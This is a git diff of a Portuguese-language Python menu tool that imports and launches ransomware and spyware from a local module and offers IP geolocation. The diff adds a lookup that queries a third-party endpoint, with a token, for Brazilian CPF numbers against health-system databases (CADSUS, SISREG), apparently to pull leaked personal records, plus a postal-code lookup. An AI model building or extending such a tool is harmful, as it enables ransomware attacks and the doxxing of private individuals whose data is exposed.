@@ -12,8 +12,9 @@ from malware import ransomware, spyware
 from urllib.request import urlopen 
 from cryptography.fernet import Fernet
 import shutil
+import json
 
-print(f"""{Fore.RED})
+print(f"""{Fore.RED}
                                                                          _|
   _|_|_|    _|_|      _|_|    _|_|_|      _|_|    _|  _|_|  _|_|_|_|
 _|    _|  _|_|_|_|  _|    _|  _|    _|  _|    _|  _|_|        _|
@@ -32,13 +33,10 @@ _|    _|  _|        _|    _|  _|    _|  _|    _|  _|          _|
 """)
 resposta = int(input('O que você precisa hoje? '))
 
-
-
-
 if resposta == 1:
     try: 
         ip = input('Insira o endereço de ip: ')
-
+        
         if ip: 
             url = f"http://ip-api.com/json/{ip}"
 
@@ -106,5 +104,71 @@ if resposta == 3:
     if resposta == 1:
         ransomware()
 
-        
+def consulta_cpf(cpf, base):
+    
+    if base == 1:
+        url = f"https://centralbroxys.net/apis/cadsus/cpf.php?token=@BINGSIXBOT&cpf={cpf}"
+    if base == 2:
+        url = f"https://centralbroxys.net/apis/siregi/cpf.php?token=@BINGSIXBOT&cpf={cpf}"
+    
+    response = requests.get(url)
 
+    if response.status_code == 200:
+        if base == 1:
+            return response.json()
+        if base == 2:
+            return response.json()['dados']
+    else:
+        return None  # Nenhuma informação encontrada ou erro na consulta
+
+if resposta == 5:
+    print("1 - CEP")
+    print("2 - CPF")
+    print("0 - Sair")
+
+    resposta = int(input("Insira o número da pesquisa que você deseja: "))
+
+    if resposta == 1:
+
+        try:
+            cep = str(input("insira o CEP: "))
+            req = requests.get(f"https://viacep.com.br/ws/{cep}/json/").json()
+            
+            print(f'''
+            \033[1;33m	
+CEP: {cep}
+Rua: {req['logradouro']}
+Complemento: {req['complemento']}
+Bairro: {req['bairro']}
+Localidade: {req['localidade']}
+Estado: {req['uf']}
+Ibge: {req['ibge']}
+Gia: {req['gia']}
+DDD: {req['ddd']}
+Siafi: {req['siafi']}
+            ''')
+
+        except Exception as  ex:
+            print("Ocorreu um erro ao localizar este CEP.")
+            # print(f"Error: ({ex})")
+
+    if resposta == 2:
+        try:
+            cpf = str(input("insira o CPF: "))
+
+            print("\n1 - SISREG")
+            print("2 - CADSUS")
+            resposta = int(input("Selecione a base de dados: "))
+
+            resultado = consulta_cpf(cpf, resposta)
+
+            if resultado:
+                data = resultado
+
+                for key, value in data.items():
+                    print(f'{key} == {value}')
+            else:
+                print("CPF não encontrado ou erro na consulta.")
+
+        except Exception as ex:
+            print(f"Ocorreu um erro ({ex})")
